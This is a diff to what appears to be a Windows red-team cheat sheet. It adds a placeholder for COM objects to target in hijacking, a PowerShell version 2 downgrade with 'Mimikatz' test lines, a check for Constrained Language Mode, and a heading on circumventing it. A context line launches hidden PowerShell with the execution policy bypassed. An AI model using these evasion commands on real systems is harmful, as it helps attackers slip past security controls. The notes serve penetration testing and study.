@@ -86,6 +86,12 @@ Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"
 Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
 ```
 
+### **Common COM Objects to Target**
+
+```
+# TODO
+```
+
 # **Privilege Escalation**
 
 ## **Unquoted Service Path**
@@ -127,8 +133,14 @@ powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionP
 ### **PowerShell Downgrade**
 
 ```
+# Test command before downgrade
+echo "Mimikatz"
+
 # Downgrade PowerShell to Version 2 which has less protections
 powershell -version 2
+
+# Test command after downgrade
+echo "Mimikatz"
 ```
 
 ### **Constrained Language Mode**
@@ -136,5 +148,7 @@ powershell -version 2
 #### **Detecting Constrained Language Mode**
 
 ```
-
+$ExecutionContext.SessionState.LanguageMode
 ```
+
+### **Circumvent Constrained Language Mode**
